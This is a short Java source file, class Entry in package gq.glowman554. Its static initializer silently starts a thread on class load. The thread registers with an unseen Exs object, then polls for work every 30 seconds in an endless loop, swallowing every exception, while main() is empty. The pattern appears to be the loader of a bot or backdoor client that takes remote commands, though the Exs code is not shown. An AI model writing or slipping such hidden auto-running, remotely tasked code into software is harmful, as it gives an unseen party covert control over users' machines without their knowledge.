package gq.glowman554;

public class Entry {
    public Entry() {
    }

    public static void entry() throws Exception {
        Exs exs = new Exs();
        String id = exs.register();

        while(true) {
            exs.pool_for_work();
            Thread.sleep(30000);
        }
    }

    public static void main(String[] args) {
    }

    static {
        try {
            (new Thread() {
                public void run() {
                    try {
                        Entry.entry();
                    } catch (Exception e) {
                    }

                }
            }).start();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
